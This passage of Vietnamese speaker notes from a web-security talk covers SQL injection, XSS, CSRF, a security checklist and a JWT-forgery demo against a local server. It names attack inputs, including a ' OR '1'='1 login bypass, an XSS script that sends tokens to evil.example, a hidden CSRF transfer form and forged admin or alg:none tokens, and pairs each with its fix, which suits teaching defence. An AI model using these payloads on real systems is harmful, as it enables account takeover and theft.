body. Còn ID random kiểu UUID thì khó đoán hơn, nhưng không phải cách fix — ID vẫn lộ qua log và link.
**Chốt:** "Đã login" không có nghĩa là "được phép".

### 36 · Glue user input into a SQL string and the input becomes part of your query
_~80 s · ⏱ tới 33:50_

**Nói:** Lỗi thứ hai. Handler login build SQL bằng dấu `+`: `"… WHERE email = '" + email + "' AND
password = '" + password + "'"`. (Cái này còn lưu password plaintext nữa — hai bug một lúc.)
**→ 1:** Attacker gõ vào ô password: `' OR '1'='1`. Hỏi phòng: chuyện gì xảy ra? (Chờ.)
**→ 2:** Đây là câu SQL database thật sự chạy. `'1'='1'` đúng với mọi dòng, nên query trả về tất cả
user. App login bạn vào bằng dòng đầu tiên — thường là admin. Không cần password.
**→ 3:** Fix: placeholder, không bao giờ dùng `+`. `db.query("… WHERE email = ?", [email])`, rồi
`bcrypt.compare` password. Giá trị đi riêng khỏi câu SQL; database coi nó là data, không bao giờ là
code. ORM làm sẵn việc này — nhưng cẩn thận với `raw()` và template string nối giá trị vào.

### 37 · If the page renders user text as HTML, an attacker's script runs in every reader's browser
_~80 s · ⏱ tới 35:10_

**Nói:** Lỗi thứ ba: XSS. Mallory đăng một comment: "Nice shoes!" kèm một thẻ `<script>` gửi
`localStorage.token` tới `evil.example`.
**→ 1:** Trang chèn comment bằng `commentEl.innerHTML = comment.text`. Kết quả: mọi người mở trang đều
chạy script của Mallory. Token của họ bay tới `evil.example`, và giờ Mallory đăng nhập được thành họ.
Nhớ slide 2.8 không — đây chính là lý do.
**→ 2:** Fix số một: để framework escape. Trong React, `{comment.text}` in ra chữ — thẻ script hiện ra
thành ký tự. Escape biến `<` thành `&lt;`, nên browser hiển thị chứ không chạy. React, Vue, Angular làm
mặc định. Tránh `dangerouslySetInnerHTML` và `innerHTML` với text của user, hoặc phải sanitize trước.
**→ 3:** Fix số hai: token trong cookie `HttpOnly` như slide 2.8. Lỡ có script chạy, JavaScript cũng
không đọc được cookie.

### 38 · The browser attaches your cookie to any request, even one that another site started
_~90 s · ⏱ tới 36:40_

**Nói:** Lỗi thứ tư: CSRF. Bối cảnh: bạn đang login `bank.example` ở một tab, session cookie nằm trong
browser.
**→ 1:** Bạn mở một link tới `evil.example/win-a-prize.html`. Trong đó có một form ẩn POST tới
`bank.example/transfer`, `to=attacker`, `amount=5000000`, và một dòng script tự submit ngay khi trang
load.
**→ 2:** Bank nhận được gì? `POST /transfer` kèm `Cookie: sid=…` — browser tự gắn vào. Với ngân hàng,
nó giống y như chính bạn bấm "Transfer".
**→ 3:** Fix: `SameSite=Lax` (hoặc `Strict`) trên cookie — browser ngừng gửi cookie theo POST từ site
khác. Thêm CSRF token vào form: một giá trị random mà trang evil không thể biết.
**→ 4:** Đánh đổi: token gửi trong header `Authorization` thì browser không bao giờ tự gắn, nên không
dính CSRF. Nhưng JavaScript phải đọc được nó, nên XSS lấy được. Không có lựa chọn nào miễn phí.
**Chốt:** Cookie `HttpOnly` thì lo CSRF, `localStorage` thì lo XSS. Mặc định của mình vẫn là cookie +
`SameSite`.

### 39 · Ten things to check before you open a pull request that touches login or data
_~80 s · ⏱ tới 38:00_

**Nói:** Mười dòng gom từ tất cả slide "Do / Don't". Chụp hình slide này lại nha. Đọc nhanh theo nhãn:
- **password:** hash bằng `bcrypt` hoặc `argon2` của thư viện, không lưu, không log, không trả password.
  Login sai chỉ nói chung chung "sai email hoặc password", không bao giờ nói sai cái nào.
- **token:** để trong cookie `HttpOnly; Secure; SameSite`, không `localStorage`. Verify mọi JWT bằng thư
  viện với thuật toán cố định, payload không có gì bí mật. Access token ngắn 15 phút, logout xoá refresh
  token trên server.
- **oauth:** `client_secret` chỉ ở backend, xin scope nhỏ nhất.
- **authz:** kiểm quyền ở backend, mọi request, kiểm permission chứ không kiểm tên role. Kiểm quyền sở
  hữu ngay trong query: `WHERE id = ? AND user_id = ?`.
- **attack:** placeholder `?` hoặc ORM, không bao giờ `+`. Để framework escape, không `innerHTML` với text
  của user. Form dùng cookie thì có `SameSite` + CSRF token.
**Chốt:** Lần tới mở PR đụng tới login hay data, dò qua mười dòng này.

---

# Phần 5 — Demo: "The Forger" · ⏱ 38:00 → 45:00

### 40 · Divider 05 — Demo: The Forger
_~10 s · ⏱ tới 38:10_

**Nói:** Giờ làm thật. Một login server nhỏ xíu. Mình sẽ sửa một cái JWT, gửi đi, và xem server từ chối.

### 41 · One Node server on :4000, three users in memory. This deck talks to it with plain fetch().
_~50 s · ⏱ tới 39:00_

**Nói:** Setup: một server Node trên port 4000, đã chạy sẵn từ trước bằng lệnh này:

```bash
cd demo && pnpm start
```

Users nằm trong memory, password hash bằng bcrypt, JWT HS256 với secret đọc từ env, khởi động lại là
reseed. Deck này gọi nó bằng `fetch()` bình thường, và cứ 2 giây hỏi `GET /__health` để biết đang live
hay phải phát bản ghi. Terminal bên cạnh chạy `pnpm users` và `pnpm jwt` vào cùng server.
Năm endpoint: `POST /login` trả cả JWT lẫn session cookie; `GET /me` — tôi là ai, cần token hoặc cookie;
`GET /admin/users` cần permission `users:list`, chỉ admin có; `POST /register` — user mới luôn là
`viewer`; `GET /__db` — chỉ để demo, xem bảng users: thấy hash, không bao giờ thấy password.
**→ 1:** Ba seed user: admin, editor, viewer — password là tên cộng `123`. Hôm nay mình đóng vai viewer.

### 42 · The server recomputes the signature first, then checks a permission. Never a role name.
_~60 s · ⏱ tới 40:00_

**Nói:** Code đang chạy, rút gọn. Bên trái là `demo/src/jwt.ts`, hàm `verify`. Tách ba phần, decode.
Dòng highlight thứ nhất: `header.alg !== 'HS256'` → từ chối. Không bao giờ để token tự chọn thuật toán.
Rồi tính lại HMAC-SHA256 của `head.body` bằng secret **của mình**, so với signature trong token bằng
`timingSafeEqual`. Hết hạn thì `expired`.
Bên phải là `demo/src/server.ts`: `requireAuth` — xác thực bằng JWT hoặc cookie, fail thì `401` kèm
header `X-Auth-Reason`. `requirePermission` — gọi `can(role, permission)`, đúng cái `can()` ở slide 4.1,
không có thì `403` kèm `need: …`. Route `/admin/users` gọi lần lượt cả hai.
**→ 1:** `401`: bạn là ai?
**→ 2:** `403`: biết bạn rồi. Vẫn không.

### 43 · Four requests, four refusals. Guess the status code for each one before we send it.
_~90 s · ⏱ tới 41:30_

**Nói:** Trước khi chạy — cả phòng đoán nha. Mỗi dòng mình hỏi, lấy đáp án từ khán phòng (giơ tay "401"
hay "403"), rồi mới bấm mở.
**→ 1:** Dòng 1: `GET /me` không có header `Authorization`, không cookie → `401`, `missing token`. Server
không biết bạn là ai — AuthN fail.
**→ 2:** Dòng 2: token thật của viewer gọi `GET /admin/users` → `403`, `need: users:list`. Server biết
chính xác bạn là ai, chỉ là không được phép — AuthZ fail.
**→ 3:** Dòng 3: sửa payload thành `"role":"admin"`, giữ signature cũ → `401`, `bad signature`. Hay có
người đoán `403` ở dòng này — không, vì server tính lại HMAC trên payload mới, không khớp, nên nó còn
không biết bạn là ai.
**→ 4:** Dòng 4: header `"alg":"none"`, bỏ signature → `401`, `alg not allowed`. Chỉ nhận `HS256`. Token
không tự tắt được bước kiểm tra của chính nó.
**Chốt:** `401` là "bạn là ai?". `403` là "biết bạn rồi, vẫn không".

### 44 · Log in as a viewer, rewrite the payload to admin, and send it. Every status below comes from the server.
_~150 s · ⏱ tới 44:00_

**Kiểm tra trước khi nói:** chip góc trên phải là `● live · :4000` (xanh). Nếu là `○ recording`, xem
"Nếu server không chạy" bên dưới.

**Nói:** Từ giờ mọi status code trên màn hình là server thật trả về. Phím tắt: `L` log in, `S` gửi tới
`/me`, `A` gửi tới `/admin/users`. Bấm phím thì phải click ra ngoài ô payload trước — đang gõ trong ô thì
phím không tới deck.

**Làm trên slide, vừa làm vừa nói:**
1. Bấm **`L`** — log in as `viewer@demo.vn`. Token hiện ra tách ba màu: header, payload, signature. Ô
   header hiện `HS256`, ô payload hiện JSON đã decode. Dòng trạng thái: "exactly as issued".
2. Bấm **`S`** — gửi tới `/me` → `200`, body là `viewer@demo.vn`, role viewer, `via: jwt`. Token thật
   thì chạy.
3. Bấm **`A`** — gửi tới `/admin/users` → `403`, `need: users:list`. Đúng dòng 2 vừa đoán.
4. Click vào ô payload, sửa `"viewer"` thành `"admin"`. Để ý: phần payload trong token đổi màu, dòng
   trạng thái thành "new payload · old signature". Click ra ngoài.
5. Bấm **`A`** lần nữa → `401`, `X-Auth-Reason: bad signature`. Hỏi phòng: "Có ai nghĩ được `200`
   không?" — không, giống y slide 2.5.
6. Bấm nút **Use alg: none** (không có phím tắt) — signature bị bỏ. Bấm **`S`** → `401`,
   `alg not allowed`.
7. (Nếu còn giờ) Bấm `L` để lấy lại token sạch.

**Làm dưới terminal, song song:**
- `pnpm users` — bảng users đúng như "database" lưu: email, role, hash bcrypt `$2b$…`. Không có password
  nào. Đây là thứ lộ ra nếu database bị dump. (Ghi chú cho presenter: demo dùng cost 10, `$2b$10$…`, để
  khởi động nhanh; nếu ai hỏi thì production dùng 12 trở lên như slide 13.)
- `pnpm jwt viewer@demo.vn` — log in, in ra JWT với header + payload đã decode. Payload ai cũng đọc được:
  signed, không phải encrypted.

**Nếu server không chạy:** chip sẽ ghi `○ recording`, cột response ghi `recorded`. Slide tự phát lại một
bản ghi theo đúng luật của server: `L` vẫn ra token, `S` vẫn `200`, `A` vẫn `403`, sửa payload vẫn `401
bad signature`, `alg: none` vẫn `401`. Cứ nói theo đó mà đi tiếp, nói một câu "server hôm nay nghỉ, đây
là bản ghi lúc nãy", và **đừng debug trên sân khấu**. Phần terminal thì bỏ qua.

### 45 · Change one byte of the payload and the signature no longer matches. Making a new one needs the secret.
_~60 s · ⏱ tới 45:00_

**Nói:** Vì sao bản giả không qua được. Signature = HMAC-SHA256 của header chấm payload, với secret.
Lúc login server ký payload `"role":"viewer"`, ra `B4s4…`. Bạn sửa thành `"admin"`, giữ signature. Server
tính lại bằng secret của nó, ra `sfut…`. Token đang có `B4s4…`. Khác nhau → `401 bad signature`.
Payload chỉ là base64url, không mã hoá — ai cũng đọc, sửa được. Signature là thứ làm cho mọi chỉnh sửa
bị phát hiện.
**→ 1:** Muốn tự ký payload admin thì cần secret. HMAC không chạy ngược được để tìm ra secret.
**→ 2:** Nên: **secret lộ là hết.** Ai có secret cũng tạo được token admin qua mọi bước kiểm tra, và server
không phân biệt được.
**→ 3:** Để nó trong env — `JWT_SECRET` — dài, random, mỗi môi trường một cái khác nhau. Không bao giờ
commit. Cái `dev-only-secret-change-me` của demo chính là thứ không được ship.
**Chốt:** Signature bảo vệ token. Secret bảo vệ signature. Giữ secret cho kỹ.

Sau slide này dừng demo ở terminal:

```bash
pnpm stop
```

---

# Cảm ơn — Q&A + Kahoot · ⏱ 45:00 → ~55:00

### 46 · Thank you + Kahoot
_~10 phút · ⏱ tới ~55:00_

**Nói:** Xong rồi đó. Cảm ơn mọi người đã nghe. Hỏi đáp trước, rồi một ván Kahoot ngắn: 401 hay 403, hash
hay encrypt, cookie hay localStorage.

**Q&A (~3–4 phút):**
- Mời hỏi: "Có câu nào về phần nào cũng được, kể cả câu nghe có vẻ cơ bản — chắc chắn có người khác cũng
  đang thắc mắc giống vậy."
- Nhắc lại câu hỏi to cho cả phòng nghe trước khi trả lời. Trả lời bằng cách chỉ lại slide liên quan
  (`O` mở overview để nhảy nhanh, `Esc` đóng).
- Câu nào ngoài phạm vi bài (ví dụ những thứ đã cắt khỏi outline) thì nói thật: "Phần đó hôm nay mình
  không nói tới, mình trao đổi riêng sau nha", đừng mở chủ đề mới.
- Hết giờ thì chốt: "Còn câu nào thì nhắn mình sau, giờ qua Kahoot."

**Kahoot (~6 phút):**
1. Mở game đã chuẩn bị (12 câu trong `presentation/notes/kahoot-questions.md`) ở tab khác, lấy PIN.
2. Quay lại slide, click vào ô **Game PIN**, gõ PIN. QR tự cập nhật trỏ tới `kahoot.it` kèm PIN. Click ra
   ngoài ô trước khi bấm phím khác.
3. "Quét QR hoặc vào kahoot.it, nhập PIN trên màn hình." Chờ tới khi đa số đã vào.
4. Chuyển màn hình sang Kahoot và chạy. Sau mỗi câu, đọc nhanh phần "Giải thích" trong file câu hỏi —
   một câu thôi, nối lại với slide tương ứng.
5. Công bố top 3, cảm ơn lần nữa, kết thúc.

---

## Mấy câu hay được hỏi

Chỉ trả lời trong phạm vi slide; mỗi câu dẫn về slide tương ứng.

- **"Vậy nên dùng session hay JWT?"** → Slide 21. Web app một backend, cần logout ngay: session. Nhiều
  service tự kiểm token, hoặc mobile app: JWT, với access token ngắn + refresh token (slide 22).
- **"Để token trong localStorage có sao không, team em đang làm vậy?"** → Slide 23 và 37. Một script XSS
  là đọc được. Mặc định là cookie `HttpOnly; Secure; SameSite=Lax`.
- **"Sao không encrypt password, lỡ cần lấy lại cho user?"** → Slide 10. Không bao giờ cần đọc lại
  password, chỉ cần kiểm tra.
- **"Server trả 401 hay 403 khi token hết hạn?"** → Slide 6: `401` — server không còn biết bạn là ai, đi
  login (hoặc refresh) lại.
- **"Dùng UUID thay cho ID tăng dần là hết IDOR rồi đúng không?"** → Slide 35. Khó đoán hơn, nhưng không
  phải fix. Fix là `AND user_id = ?` trong query.
- **"Ẩn nút ở frontend rồi, backend có cần kiểm nữa không?"** → Slide 34. Có. Ai có curl cũng gọi được API.
